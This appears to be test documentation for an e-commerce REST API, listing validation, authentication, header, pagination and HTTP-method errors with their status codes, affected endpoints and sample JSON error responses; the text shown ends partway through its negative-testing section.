# E-Commerce API - Comprehensive Test Error Documentation

## Overview
This document outlines all potential errors that can occur when testing the E-Commerce Backend API across different testing scenarios. Each test type includes the error description, reason for occurrence, affected endpoints, and example responses.

---

## Table of Contents
1. [Functional Testing Errors](#functional-testing-errors)
2. [Negative Testing Errors](#negative-testing-errors)
3. [Security Testing Errors](#security-testing-errors)
4. [Contract Testing Errors](#contract-testing-errors)
5. [Fuzz Testing Errors](#fuzz-testing-errors)
6. [HTTP Status Code Reference](#http-status-code-reference)

---

# FUNCTIONAL TESTING ERRORS

## 1. CRUD_VALIDATION

### Error: Missing Required Fields
- **Description**: Required fields are not provided in the request payload
- **Why It Occurs**: POST/PUT endpoints expect specific mandatory fields (email, password, title, price, etc.)
- **Status Code**: 422 (Unprocessable Entity)
- **Affected Endpoints**:
  - `POST /signup` - Missing: email, password, confirmPassword
  - `POST /login` - Missing: email, password
  - `POST /admin/add-item` - Missing: title, price, description, image
  - `POST /admin/edit-item/{id}` - Missing: title, price, description
  - `POST /reset` - Missing: email

### Error Example:
```json
{
  "errors": [
    {
      "msg": "Invalid value",
      "param": "email"
    },
    {
      "msg": "Invalid value",
      "param": "password"
    }
  ]
}
```

---

### Error: Duplicate Email During Signup
- **Description**: User attempts to register with an email that already exists
- **Why It Occurs**: Database constraint violation or business logic validation
- **Status Code**: 422 or 409 (Conflict)
- **Affected Endpoints**:
  - `POST /signup`

### Error Example:
```json
{
  "errors": [
    {
      "msg": "Email already exists",
      "param": "email"
    }
  ]
}
```

---

### Error: Invalid Item ID Format
- **Description**: Item ID provided is not a valid MongoDB ObjectId format
- **Why It Occurs**: Path parameter doesn't match the expected ObjectId format (24-character hex string)
- **Status Code**: 400 or 422
- **Affected Endpoints**:
  - `GET /items/{id}`
  - `POST /add-to-cart/{id}`
  - `DELETE /delete-from-cart/{id}`
  - `PUT /admin/edit-item/{id}`
  - `DELETE /admin/delete-item/{id}`
  - `GET /orders/{id}`

### Error Example:
```json
{
  "message": "Invalid item ID format"
}
```

---

### Error: Item Not Found
- **Description**: Requested item doesn't exist in the database
- **Why It Occurs**: User provides a valid ObjectId that has no corresponding document
- **Status Code**: 404 (Not Found)
- **Affected Endpoints**:
  - `GET /items/{id}`
  - `POST /add-to-cart/{id}`
  - `DELETE /delete-from-cart/{id}`
  - `PUT /admin/edit-item/{id}`
  - `DELETE /admin/delete-item/{id}`

### Error Example:
```json
{
  "message": "Item not found"
}
```

---

### Error: Empty Cart
- **Description**: User attempts to create an order with an empty cart
- **Why It Occurs**: The cart has no items added
- **Status Code**: 400 (Bad Request)
- **Affected Endpoints**:
  - `POST /create-order`

### Error Example:
```json
{
  "message": "Cart is empty"
}
```

---

### Error: Item Not in Cart
- **Description**: User attempts to remove an item that doesn't exist in their cart
- **Why It Occurs**: Item ID provided isn't in the user's cart items array
- **Status Code**: 404 (Not Found)
- **Affected Endpoints**:
  - `DELETE /delete-from-cart/{id}`

### Error Example:
```json
{
  "message": "Item not in cart"
}
```

---

### Error: Order Not Found
- **Description**: Requested order doesn't exist in the database
- **Why It Occurs**: Invalid order ID provided
- **Status Code**: 404 (Not Found)
- **Affected Endpoints**:
  - `GET /orders/{id}`

### Error Example:
```json
{
  "message": "Order not found"
}
```

---

## 2. SCHEMA_VALIDATION

### Error: Invalid Email Format
- **Description**: Email doesn't match the RFC 5322 email format
- **Why It Occurs**: Express-validator checks for valid email pattern
- **Status Code**: 422 (Unprocessable Entity)
- **Affected Endpoints**:
  - `POST /login` - email: "invalidemail" or "user@"
  - `POST /signup` - email: "test.example.com"
  - `POST /reset` - email: "user@domain"

### Error Example:
```json
{
  "errors": [
    {
      "msg": "Invalid email format",
      "param": "email"
    }
  ]
}
```

---

### Error: Password Too Short
- **Description**: Password is less than minimum required length
- **Why It Occurs**: Schema requires minLength: 5 for passwords
- **Status Code**: 422 (Unprocessable Entity)
- **Affected Endpoints**:
  - `POST /login` - password length < 5
  - `POST /signup` - password length < 5
  - `POST /reset/{token}` - password length < 5

### Error Example:
```json
{
  "errors": [
    {
      "msg": "Password must be at least 5 characters",
      "param": "password"
    }
  ]
}
```

---

### Error: Password Mismatch
- **Description**: password and confirmPassword don't match
- **Why It Occurs**: User enters different values in password confirmation
- **Status Code**: 422 (Unprocessable Entity)
- **Affected Endpoints**:
  - `POST /signup`
  - `POST /reset/{token}`

### Error Example:
```json
{
  "errors": [
    {
      "msg": "Passwords do not match",
      "param": "confirmPassword"
    }
  ]
}
```

---

### Error: Invalid Price Format
- **Description**: Price is not a valid number or is negative
- **Why It Occurs**: Schema requires number type with minimum: 0
- **Status Code**: 422 (Unprocessable Entity)
- **Affected Endpoints**:
  - `POST /admin/add-item` - price: "abc" or price: -50
  - `PUT /admin/edit-item/{id}` - price: "999x" or price: -100

### Error Example:
```json
{
  "errors": [
    {
      "msg": "Price must be a valid positive number",
      "param": "price"
    }
  ]
}
```

---

### Error: Title Too Short
- **Description**: Product title is less than minimum required length
- **Why It Occurs**: Schema requires minLength: 3 for title
- **Status Code**: 422 (Unprocessable Entity)
- **Affected Endpoints**:
  - `POST /admin/add-item` - title: "AB"
  - `PUT /admin/edit-item/{id}` - title: "X"

### Error Example:
```json
{
  "errors": [
    {
      "msg": "Title must be at least 3 characters",
      "param": "title"
    }
  ]
}
```

---

### Error: Description Invalid Length
- **Description**: Description is shorter than 5 or longer than 100 characters
- **Why It Occurs**: Schema requires minLength: 5 and maxLength: 100
- **Status Code**: 422 (Unprocessable Entity)
- **Affected Endpoints**:
  - `POST /admin/add-item` - description: "abc"
  - `PUT /admin/edit-item/{id}` - description: "test description that is way too long and exceeds one hundred characters which should"

### Error Example:
```json
{
  "errors": [
    {
      "msg": "Description must be between 5 and 100 characters",
      "param": "description"
    }
  ]
}
```

---

### Error: Invalid Image Format
- **Description**: Uploaded file is not PNG, JPG, or JPEG format
- **Why It Occurs**: File filter rejects unsupported file types
- **Status Code**: 400 (Bad Request)
- **Affected Endpoints**:
  - `POST /admin/add-item` - image: PDF, GIF, BMP, etc.
  - `PUT /admin/edit-item/{id}` - image: WEBP, TIFF, etc.

### Error Example:
```json
{
  "message": "Invalid image format. Only PNG, JPG, JPEG are allowed"
}
```

---

### Error: Missing Image File
- **Description**: Image is a required field but not provided
- **Why It Occurs**: multipart/form-data request without image part
- **Status Code**: 422 (Unprocessable Entity)
- **Affected Endpoints**:
  - `POST /admin/add-item`

### Error Example:
```json
{
  "errors": [
    {
      "msg": "Image is required",
      "param": "image"
    }
  ]
}
```

---

### Error: Invalid Quantity Type
- **Description**: Quantity is not an integer or is less than 1
- **Why It Occurs**: Cart schema requires integer with minimum: 1
- **Status Code**: 422 (Unprocessable Entity)
- **Affected Endpoints**:
  - Cart operations with invalid quantity in request

### Error Example:
```json
{
  "errors": [
    {
      "msg": "Quantity must be a positive integer",
      "param": "quantity"
    }
  ]
}
```

---

## 3. QUERY_PARAM_TEST

### Error: Invalid Query Parameter
- **Description**: Unknown or invalid query parameters provided
- **Why It Occurs**: API doesn't support filtering/pagination parameters (current implementation)
- **Status Code**: 400 or ignored (depends on implementation)
- **Affected Endpoints**:
  - `GET /items?invalid_param=value`
  - `GET /admin/items?page=1&limit=10` (if not supported)
  - `GET /orders?filter=pending` (if not supported)

### Error Example:
```json
{
  "message": "Invalid query parameters"
}
```

---

### Error: Invalid Query Parameter Type
- **Description**: Query parameter provided with wrong data type
- **Why It Occurs**: String provided instead of number for pagination params
- **Status Code**: 422 (Unprocessable Entity)
- **Affected Endpoints**:
  - Pagination endpoints with `?page=abc&limit=xyz`

### Error Example:
```json
{
  "errors": [
    {
      "msg": "Page parameter must be a positive integer",
      "param": "page"
    }
  ]
}
```

---

## 4. HEADER_TEST

### Error: Missing Content-Type Header
- **Description**: POST/PUT requests sent without Content-Type header
- **Why It Occurs**: Express middleware expects proper headers for JSON/multipart form data
- **Status Code**: 400 or 415 (Unsupported Media Type)
- **Affected Endpoints**:
  - `POST /signup`
  - `POST /login`
  - `POST /admin/add-item`
  - `PUT /admin/edit-item/{id}`

### Error Example:
```json
{
  "message": "Content-Type header is missing or invalid"
}
```

---

### Error: Unsupported Content-Type
- **Description**: Request sent with unsupported Content-Type (e.g., XML instead of JSON)
- **Why It Occurs**: Express only configured to parse JSON and urlencoded
- **Status Code**: 415 (Unsupported Media Type) or 400
- **Affected Endpoints**:
  - All endpoints expecting JSON/multipart but receiving different types

### Error Example:
```json
{
  "message": "Unsupported Content-Type: application/xml"
}
```

---

### Error: Missing Accept Header
- **Description**: Client doesn't specify acceptable response formats
- **Why It Occurs**: API doesn't validate Accept header
- **Status Code**: 200 (Content-Type defaults to application/json)
- **Affected Endpoints**:
  - All GET endpoints

---

### Error: Invalid Authorization Header Format
- **Description**: Authorization header not in "Bearer <token>" format
- **Why It Occurs**: Middleware expects "Bearer <token>" format specifically
- **Status Code**: 401 (Unauthorized)
- **Affected Endpoints**:
  - `GET /items/{id}`
  - `POST /add-to-cart/{id}`
  - `DELETE /delete-from-cart/{id}`
  - `POST /create-order`
  - `GET /orders`
  - `GET /orders/{id}`
  - `POST /admin/add-item`
  - `GET /admin/items`
  - `PUT /admin/edit-item/{id}`
  - `DELETE /admin/delete-item/{id}`

### Error Example:
```json
{
  "message": "Not Authorized"
}
```

---

### Error: Custom Headers Ignored
- **Description**: Custom headers provided but not used by API
- **Why It Occurs**: API only processes standard HTTP headers
- **Status Code**: 200 (Custom headers are silently ignored)
- **Affected Endpoints**:
  - All endpoints with custom headers

---

## 5. COOKIE_TEST

### Error: Session Cookie Missing
- **Description**: JWT token not persisted in cookie (API uses header-based auth)
- **Why It Occurs**: Current implementation uses Authorization header, not cookies
- **Status Code**: 401 (Unauthorized)
- **Affected Endpoints**:
  - All protected endpoints expecting cookie-based auth

### Error Example:
```json
{
  "message": "Not Authorized"
}
```

---

### Error: Expired Cookie
- **Description**: If cookies were used, expired ones would cause auth failures
- **Why It Occurs**: JWT token expires after 1 hour
- **Status Code**: 401 (Unauthorized)
- **Affected Endpoints**:
  - All protected endpoints

### Error Example:
```json
{
  "message": "Could not process your authentication status"
}
```

---

## 6. PATH_PARAM_TEST

### Error: Invalid ObjectId Format
- **Description**: Path parameter doesn't match MongoDB ObjectId format
- **Why It Occurs**: ObjectId must be exactly 24 hexadecimal characters
- **Status Code**: 400 or 422
- **Affected Endpoints**:
  - `GET /items/{id}` - id: "123"
  - `POST /add-to-cart/{id}` - id: "invalid"
  - `DELETE /delete-from-cart/{id}` - id: "abc"
  - `PUT /admin/edit-item/{id}` - id: "short"
  - `DELETE /admin/delete-item/{id}` - id: "xyz"
  - `GET /orders/{id}` - id: "notvalid"

### Error Example:
```json
{
  "message": "Invalid object ID format"
}
```

---

### Error: Missing Path Parameter
- **Description**: URL doesn't include required path parameter
- **Why It Occurs**: Route definition requires path parameter
- **Status Code**: 404 (Not Found) - route not matched
- **Affected Endpoints**:
  - `GET /items/` (without ID)
  - `POST /add-to-cart/` (without ID)
  - `POST /reset/` (without token)
  - `GET /orders/` (returns list, but without ID no specific order)

### Error Example:
```json
{
  "message": "Not Found"
}
```

---

### Error: Valid ID Format but Resource Not Found
- **Description**: Path parameter is a valid ObjectId but doesn't exist in database
- **Why It Occurs**: Resource was deleted or never existed
- **Status Code**: 404 (Not Found)
- **Affected Endpoints**:
  - `GET /items/{id}` - id: "507f1f77bcf86cd799439011" (valid format, not found)
  - `POST /add-to-cart/{id}` - Valid ObjectId but item doesn't exist
  - `PUT /admin/edit-item/{id}` - Valid ObjectId but item not owned by user
  - `DELETE /admin/delete-item/{id}` - Valid ObjectId but item doesn't exist
  - `GET /orders/{id}` - Valid ObjectId but order doesn't exist

### Error Example:
```json
{
  "message": "Item not found"
}
```

---

### Error: Special Characters in Path Parameter
- **Description**: Path contains special characters that break ObjectId parsing
- **Why It Occurs**: Characters like %, &, # cause URL encoding issues
- **Status Code**: 400 or 404
- **Affected Endpoints**:
  - Any endpoint with path parameter: id: "507f%1f77bc%f8%6cd"

---

## 7. WORKFLOW_CHAINING

### Error: User Not Authenticated Before Protected Operation
- **Description**: Attempting protected operation without login
- **Why It Occurs**: User hasn't obtained authentication token
- **Status Code**: 401 (Unauthorized)
- **Affected Endpoints**:
  - `POST /add-to-cart/{id}`
  - `DELETE /delete-from-cart/{id}`
  - `POST /create-order`
  - `GET /orders`
  - `GET /orders/{id}`
  - `POST /admin/add-item`
  - `GET /admin/items`
  - `PUT /admin/edit-item/{id}`
  - `DELETE /admin/delete-item/{id}`

### Error Example:
```json
{
  "message": "Not Authorized"
}
```

---

### Error: Accessing Cart Before Adding Items
- **Description**: Getting cart that has no items
- **Why It Occurs**: First cart access returns empty array
- **Status Code**: 200 (Success)
- **Affected Endpoints**:
  - `GET /cart` - Returns empty items array

### Error Example:
```json
{
  "items": []
}
```

---

### Error: Creating Order from Non-Existent Cart
- **Description**: New user tries to create order without adding items
- **Why It Occurs**: Cart is empty for new users
- **Status Code**: 400 (Bad Request)
- **Affected Endpoints**:
  - `POST /create-order` - when cart.items.length === 0

### Error Example:
```json
{
  "message": "Cart is empty"
}
```

---

### Error: Modifying Order (Immutable Resource)
- **Description**: Attempting to update or delete an existing order
- **Why It Occurs**: No PUT/DELETE endpoints exist for orders (by design)
- **Status Code**: 404 or 405 (Method Not Allowed)
- **Affected Endpoints**:
  - `PUT /orders/{id}` - Endpoint doesn't exist
  - `DELETE /orders/{id}` - Endpoint doesn't exist

---

### Error: Token Expired During Workflow
- **Description**: Token expires while performing multi-step workflow
- **Why It Occurs**: JWT token set to expire in 1 hour
- **Status Code**: 401 (Unauthorized)
- **Affected Endpoints**:
  - Any protected endpoint after token expiration

### Error Example:
```json
{
  "message": "Could not process your authentication status"
}
```

---

## 8. PAGINATION

### Error: Pagination Not Implemented
- **Description**: Endpoints don't support limit/offset/page parameters
- **Why It Occurs**: Current API returns all results without pagination
- **Status Code**: 200 (All items returned)
- **Affected Endpoints**:
  - `GET /items` - Returns all items
  - `GET /admin/items` - Returns all admin items
  - `GET /orders` - Returns all user orders

### Error Example:
```json
[
  // Returns complete array without limit
]
```

---

### Error: Invalid Page Number
- **Description**: Negative or zero page number provided (if pagination existed)
- **Why It Occurs**: Page numbers should be positive integers
- **Status Code**: 422 (Unprocessable Entity)
- **Affected Endpoints**:
  - Any paginated endpoint with page: 0 or page: -1

### Error Example:
```json
{
  "errors": [
    {
      "msg": "Page must be a positive integer",
      "param": "page"
    }
  ]
}
```

---

### Error: Limit Exceeds Maximum
- **Description**: Requested page size exceeds maximum allowed limit
- **Why It Occurs**: API enforces max rows to prevent resource exhaustion
- **Status Code**: 422 (Unprocessable Entity)
- **Affected Endpoints**:
  - Any paginated endpoint with limit: 10000

### Error Example:
```json
{
  "errors": [
    {
      "msg": "Limit cannot exceed 100",
      "param": "limit"
    }
  ]
}
```

---

### Error: Invalid Offset
- **Description**: Offset parameter is negative or not a number
- **Why It Occurs**: Offset should be positive integer
- **Status Code**: 422 (Unprocessable Entity)
- **Affected Endpoints**:
  - Any paginated endpoint

---

## 9. FILTERING

### Error: Filtering Not Implemented
- **Description**: No filter parameters supported by API
- **Why It Occurs**: API doesn't implement filtering logic
- **Status Code**: 200 (Filters are ignored)
- **Affected Endpoints**:
  - `GET /items?price_min=100&price_max=500` - Ignored
  - `GET /admin/items?status=active` - Ignored
  - `GET /orders?status=pending` - Ignored

### Error Example:
```json
[
  // Returns all items regardless of filter
]
```

---

### Error: Invalid Filter Value Type
- **Description**: Filter parameter provided with incorrect data type
- **Why It Occurs**: String provided for numeric filter
- **Status Code**: 422 (Unprocessable Entity)
- **Affected Endpoints**:
  - `GET /items?price_min=abc`
  - `GET /items?price_max=xyz123`

### Error Example:
```json
{
  "errors": [
    {
      "msg": "Price filter must be a number",
      "param": "price_min"
    }
  ]
}
```

---

### Error: Invalid Filter Operator
- **Description**: Using unsupported filter operators
- **Why It Occurs**: API doesn't support advanced filtering
- **Status Code**: 400 or ignored
- **Affected Endpoints**:
  - `GET /items?price[$gte]=100`
  - `GET /orders?date[$between]=2024-01-01,2024-12-31`

---

### Error: Conflicting Filters
- **Description**: Filters that contradict each other (e.g., min > max)
- **Why It Occurs**: No validation to check filter logic
- **Status Code**: 200 (Returns empty or unexpected results)
- **Affected Endpoints**:
  - `GET /items?price_min=1000&price_max=100`
  - `GET /orders?date_from=2024-12-31&date_to=2024-01-01`

---

## 10. SORTING

### Error: Sorting Not Implemented
- **Description**: No sort parameters supported by API
- **Why It Occurs**: API doesn't implement sorting logic
- **Status Code**: 200 (Results returned in default order)
- **Affected Endpoints**:
  - `GET /items?sort=price` - Ignored
  - `GET /items?sort=-createdAt` - Ignored
  - `GET /admin/items?sort=title` - Ignored
  - `GET /orders?sort=-createdAt` - Ignored

### Error Example:
```json
[
  // Returns items in database default order
]
```

---

### Error: Invalid Sort Field
- **Description**: Sorting by non-existent field
- **Why It Occurs**: Field name doesn't exist in schema
- **Status Code**: 400 or ignored
- **Affected Endpoints**:
  - `GET /items?sort=invalid_field`
  - `GET /admin/items?sort=nonexistent`

### Error Example:
```json
{
  "message": "Cannot sort by field: invalid_field"
}
```

---

### Error: Invalid Sort Order
- **Description**: Sort order is neither 'asc', 'desc', '1', nor '-1'
- **Why It Occurs**: Unrecognized sort direction
- **Status Code**: 400 or 422
- **Affected Endpoints**:
  - `GET /items?sort=price&order=invalid`
  - `GET /orders?sort=date&order=sideways`

### Error Example:
```json
{
  "errors": [
    {
      "msg": "Sort order must be 'asc' or 'desc'",
      "param": "order"
    }
  ]
}
```

---

---

# NEGATIVE TESTING ERRORS

## 1. INVALID_PARAMS

### Error: Null Values in Required Fields
- **Description**: Required fields provided with null/undefined values
- **Why It Occurs**: User sends null instead of omitting field
- **Status Code**: 422 (Unprocessable Entity)
- **Affected Endpoints**:
  - `POST /login` - email: null, password: null
  - `POST /signup` - email: null, password: null
  - `POST /admin/add-item` - title: null, price: null

### Error Example:
```json
{
  "errors": [
    {
      "msg": "Email cannot be null",
      "param": "email"
    }
  ]
}
```

---

### Error: Empty String in Required Fields
- **Description**: Required fields provided as empty strings
- **Why It Occurs**: Spaces or empty values don't pass validation
- **Status Code**: 422 (Unprocessable Entity)
- **Affected Endpoints**:
  - `POST /login` - email: "", password: ""
  - `POST /signup` - email: "   ", password: ""
  - `POST /admin/add-item` - title: "", description: ""

### Error Example:
```json
{
  "errors": [
    {
      "msg": "Email cannot be empty",
      "param": "email"
    }
  ]
}
```

---

### Error: Boolean Instead of String
- **Description**: Parameter provided as boolean when string expected
- **Why It Occurs**: JSON type mismatch
- **Status Code**: 422 (Unprocessable Entity)
- **Affected Endpoints**:
  - `POST /login` - email: true, password: false
  - `POST /admin/add-item` - title: false, description: true

### Error Example:
```json
{
  "errors": [
    {
      "msg": "Invalid value",
      "param": "email"
    }
  ]
}
```

---

### Error: Array Instead of String
- **Description**: Parameter provided as array when string expected
- **Why It Occurs**: JSON type mismatch
- **Status Code**: 422 (Unprocessable Entity)
- **Affected Endpoints**:
  - `POST /login` - email: ["user@example.com"], password: ["pass123"]
  - `POST /signup` - email: ["test@test.com"]

### Error Example:
```json
{
  "errors": [
    {
      "msg": "Invalid value",
      "param": "email"
    }
  ]
}
```

---

### Error: Object Instead of String
- **Description**: Parameter provided as object when string expected
- **Why It Occurs**: JSON type mismatch
- **Status Code**: 422 (Unprocessable Entity)
- **Affected Endpoints**:
  - `POST /admin/add-item` - title: {value: "test"}, price: {amount: 100}

### Error Example:
```json
{
  "errors": [
    {
      "msg": "Invalid value",
      "param": "title"
    }
  ]
}
```

---

### Error: Wrong Quantity Type in Cart
- **Description**: Quantity provided as string when number required
- **Why It Occurs**: JSON post request body parsing issue
- **Status Code**: 422 (Unprocessable Entity)
- **Affected Endpoints**:
  - Cart operations with quantity: "5" or quantity: "two"

### Error Example:
```json
{
  "errors": [
    {
      "msg": "Quantity must be a number",
      "param": "quantity"
    }
  ]
}
```

---

## 2. MISSING_PARAMS

### Error: Missing Email Field
- **Description**: Email field not provided in request body
- **Why It Occurs**: Required field omitted entirely
- **Status Code**: 422 (Unprocessable Entity)
- **Affected Endpoints**:
  - `POST /login` - Missing email
  - `POST /signup` - Missing email
  - `POST /reset` - Missing email

### Error Example:
```json
{
  "errors": [
    {
      "msg": "Email is required",
      "param": "email"
    }
  ]
}
```

---

### Error: Missing Password Field
- **Description**: Password field not provided in request body
- **Why It Occurs**: Required field omitted entirely
- **Status Code**: 422 (Unprocessable Entity)
- **Affected Endpoints**:
  - `POST /login` - Missing password
  - `POST /signup` - Missing password or confirmPassword
  - `POST /reset/{token}` - Missing password or confirmPassword

### Error Example:
```json
{
  "errors": [
    {
      "msg": "Password is required",
      "param": "password"
    }
  ]
}
```

---

### Error: Missing Confirm Password
- **Description**: confirmPassword field not provided during signup
- **Why It Occurs**: Required field omitted
- **Status Code**: 422 (Unprocessable Entity)
- **Affected Endpoints**:
  - `POST /signup` - Missing confirmPassword
  - `POST /reset/{token}` - Missing confirmPassword

### Error Example:
```json
{
  "errors": [
    {
      "msg": "Confirm Password is required",
      "param": "confirmPassword"
    }
  ]
}
```

---

### Error: Missing Title Field
- **Description**: Title field not provided when creating/updating item
- **Why It Occurs**: Required field omitted
- **Status Code**: 422 (Unprocessable Entity)
- **Affected Endpoints**:
  - `POST /admin/add-item` - Missing title
  - `PUT /admin/edit-item/{id}` - Missing title

### Error Example:
```json
{
  "errors": [
    {
      "msg": "Title is required",
      "param": "title"
    }
  ]
}
```

---

### Error: Missing Price Field
- **Description**: Price field not provided when creating/updating item
- **Why It Occurs**: Required field omitted
- **Status Code**: 422 (Unprocessable Entity)
- **Affected Endpoints**:
  - `POST /admin/add-item` - Missing price
  - `PUT /admin/edit-item/{id}` - Missing price

### Error Example:
```json
{
  "errors": [
    {
      "msg": "Price is required",
      "param": "price"
    }
  ]
}
```

---

### Error: Missing Description Field
- **Description**: Description field not provided when creating/updating item
- **Why It Occurs**: Required field omitted
- **Status Code**: 422 (Unprocessable Entity)
- **Affected Endpoints**:
  - `POST /admin/add-item` - Missing description
  - `PUT /admin/edit-item/{id}` - Missing description

### Error Example:
```json
{
  "errors": [
    {
      "msg": "Description is required",
      "param": "description"
    }
  ]
}
```

---

### Error: Missing Image Field
- **Description**: Image file not provided when creating item
- **Why It Occurs**: Required field omitted from multipart form
- **Status Code**: 422 (Unprocessable Entity)
- **Affected Endpoints**:
  - `POST /admin/add-item` - No image file in multipart

### Error Example:
```json
{
  "errors": [
    {
      "msg": "Image is required",
      "param": "image"
    }
  ]
}
```

---

### Error: Missing Authorization Header
- **Description**: Authorization header not provided for protected endpoint
- **Why It Occurs**: User didn't include Bearer token
- **Status Code**: 401 (Unauthorized)
- **Affected Endpoints**:
  - All endpoints requiring authentication (see HEADER_TEST)

### Error Example:
```json
{
  "message": "Not Authorized"
}
```

---

### Error: Missing Path Parameter
- **Description**: Path parameter (token, id) not provided in URL
- **Why It Occurs**: Incomplete URL
- **Status Code**: 404 (Route not found)
- **Affected Endpoints**:
  - `GET /items/` instead of `GET /items/{id}`
  - `POST /reset/` instead of `POST /reset/{token}`

---

## 3. INVALID_AUTH

### Error: Invalid Email/Password Combination
- **Description**: Email exists but password is incorrect
- **Why It Occurs**: User enters wrong password
- **Status Code**: 403 (Forbidden) or 401
- **Affected Endpoints**:
  - `POST /login`

### Error Example:
```json
{
  "message": "Incorrect username or password, please review details and try again"
}
```

---

### Error: User Not Found
- **Description**: Email provided doesn't exist in database
- **Why It Occurs**: User hasn't registered or typo in email
- **Status Code**: 404 or 401
- **Affected Endpoints**:
  - `POST /login` - Non-existent user

### Error Example:
```json
{
  "message": "User not found, please provide valid credentials"
}
```

---

### Error: Token Missing Bearer Prefix
- **Description**: JWT token provided without "Bearer " prefix
- **Why It Occurs**: Middleware expects "Bearer <token>" format
- **Status Code**: 401 (Unauthorized)
- **Affected Endpoints**:
  - All protected endpoints with Authorization: "token_only" instead of "Bearer token_only"

### Error Example:
```json
{
  "message": "Not Authorized"
}
```

---

### Error: Invalid Token Format
- **Description**: Authorization header value is not valid JWT
- **Why It Occurs**: Token is corrupted, incomplete, or malformed
- **Status Code**: 401 (Unauthorized)
- **Affected Endpoints**:
  - All protected endpoints with malformed token

### Error Example:
```json
{
  "message": "Could not process your authentication status"
}
```

---

### Error: Token Signed with Wrong Secret
- **Description**: Token claims to be from this API but signed with different secret
- **Why It Occurs**: Token from another service or tampered
- **Status Code**: 401 (Unauthorized)
- **Affected Endpoints**:
  - All protected endpoints

### Error Example:
```json
{
  "message": "Could not process your authentication status"
}
```

---

### Error: Extra Spaces in Authorization Header
- **Description**: Authorization header formatted incorrectly with extra spaces
- **Why It Occurs**: "Bearer  token" or " Bearer token" (leading/trailing spaces)
- **Status Code**: 401 (Unauthorized)
- **Affected Endpoints**:
  - All protected endpoints

### Error Example:
```json
{
  "message": "Not Authorized"
}
```

---

## 4. EXPIRED_TOKEN

### Error: Token Expired
- **Description**: JWT token has surpassed its expiration time (1 hour)
- **Why It Occurs**: Token issued more than 1 hour ago
- **Status Code**: 401 (Unauthorized)
- **Affected Endpoints**:
  - All protected endpoints after token expiration

### Error Example:
```json
{
  "message": "Could not process your authentication status"
}
```

---

### Error: Token Expires During Request
- **Description**: Token expires between request initiation and processing
- **Why It Occurs**: Very long-running requests near expiration
- **Status Code**: 401 (Unauthorized)
- **Affected Endpoints**:
  - Long-running protected endpoints

---

### Error: Refresh Token Not Implemented
- **Description**: API doesn't support token refresh mechanism
- **Why It Occurs**: No refresh endpoint exists
- **Status Code**: User must re-login after expiration
- **Affected Endpoints**:
  - All protected endpoints after 1 hour

### Error Example:
```json
{
  "message": "Session expired. Please login again."
}
```

---

### Error: Token Still Used After Revocation
- **Description**: Token continues to work even after user logs out (no revocation list)
- **Why It Occurs**: API doesn't implement token blacklist
- **Status Code**: 200 (Token works despite logout)
- **Affected Endpoints**:
  - Any protected endpoint with old but valid token

---

## 5. UNSUPPORTED_METHOD

### Error: GET Request to POST Endpoint
- **Description**: Using GET on endpoint that only accepts POST
- **Why It Occurs**: Wrong HTTP method used
- **Status Code**: 405 (Method Not Allowed) or 404
- **Affected Endpoints**:
  - `GET /login` instead of POST
  - `GET /signup` instead of POST
  - `GET /create-order` instead of POST

### Error Example:
```json
{
  "message": "Method Not Allowed"
}
```

---

### Error: POST Request to GET Endpoint
- **Description**: Using POST on endpoint that only accepts GET
- **Why It Occurs**: Wrong HTTP method used
- **Status Code**: 405 (Method Not Allowed) or 404
- **Affected Endpoints**:
  - `POST /items` instead of GET
  - `POST /cart` instead of GET
  - `POST /orders` instead of GET

### Error Example:
```json
{
  "message": "Method Not Allowed"
}
```

---

### Error: PUT Request Without Implementation
- **Description**: Sending PUT request to endpoint without PUT handler
- **Why It Occurs**: Only DELETE handler exists for cart, not PUT
- **Status Code**: 405 (Method Not Allowed) or 404
- **Affected Endpoints**:
  - `PUT /delete-from-cart/{id}` (only DELETE allowed)
  - `PUT /add-to-cart/{id}` (only POST allowed)

### Error Example:
```json
{
  "message": "Cannot PUT /delete-from-cart/123"
}
```

---

### Error: PATCH Request Not Supported
- **Description**: Using PATCH method which is not implemented
- **Why It Occurs**: API only supports full resource replacement with PUT
- **Status Code**: 405 (Method Not Allowed) or 404
- **Affected Endpoints**:
  - `PATCH /admin/edit-item/{id}` instead of PUT
  - `PATCH /items/{id}`

### Error Example:
```json
{
  "message": "Method Not Allowed"
}
```

---

### Error: HEAD Request Not Implemented
- **Description**: HEAD request to check endpoint availability
- **Why It Occurs**: API doesn't implement HEAD method handlers
- **Status Code**: 405 (Method Not Allowed) or 404
- **Affected Endpoints**:
  - `HEAD /items`
  - `HEAD /orders`

---

### Error: OPTIONS Request Returns Nothing
- **Description**: OPTIONS method for CORS preflight returns no allow headers
- **Why It Occurs**: CORS middleware not properly configured
- **Status Code**: 200 or 204 (but missing Allow header)
- **Affected Endpoints**:
  - `OPTIONS /admin/add-item`
  - `OPTIONS /login`

---

## 6. INCORRECT_DATA_TYPE

### Error: String Instead of Number
- **Description**: String provided where numeric value expected
- **Why It Occurs**: JSON parsing or user input error
- **Status Code**: 422 (Unprocessable Entity)
- **Affected Endpoints**:
  - `POST /admin/add-item` - price: "999.99" (should be number)
  - `POST /admin/edit-item/{id}` - price: "1099"

### Error Example:
```json
{
  "errors": [
    {
      "msg": "Price must be a number",
      "param": "price"
    }
  ]
}
```

---

### Error: Number Instead of String
- **Description**: Numeric value provided where string expected
- **Why It Occurs**: JSON parsing or user input error
- **Status Code**: 422 (Unprocessable Entity)
- **Affected Endpoints**:
  - `POST /login` - email: 123456, password: 111111
  - `POST /admin/add-item` - title: 12345, description: 98765

### Error Example:
```json
{
  "errors": [
    {
      "msg": "Email must be a string",
      "param": "email"
    }
  ]
}
```

---

### Error: Boolean Instead of String/Number
- **Description**: Boolean provided where other type expected
- **Why It Occurs**: JSON type mismatch
- **Status Code**: 422 (Unprocessable Entity)
- **Affected Endpoints**:
  - `POST /login` - email: false, password: true
  - `POST /admin/add-item` - price: true

### Error Example:
```json
{
  "errors": [
    {
      "msg": "Invalid value",
      "param": "email"
    }
  ]
}
```

---

### Error: Array Instead of Single Value
- **Description**: Array provided where single value expected
- **Why It Occurs**: Duplicate field keys or user error
- **Status Code**: 422 (Unprocessable Entity)
- **Affected Endpoints**:
  - `POST /login` - email: ["user@example.com", "user2@example.com"]
  - `POST /admin/add-item` - title: ["Title1", "Title2"]

### Error Example:
```json
{
  "errors": [
    {
      "msg": "Invalid value",
      "param": "email"
    }
  ]
}
```

---

### Error: Object Instead of Scalar
- **Description**: Object provided where scalar value expected
- **Why It Occurs**: Nested object sent instead of flat value
- **Status Code**: 422 (Unprocessable Entity)
- **Affected Endpoints**:
  - `POST /login` - email: {value: "test@test.com"}
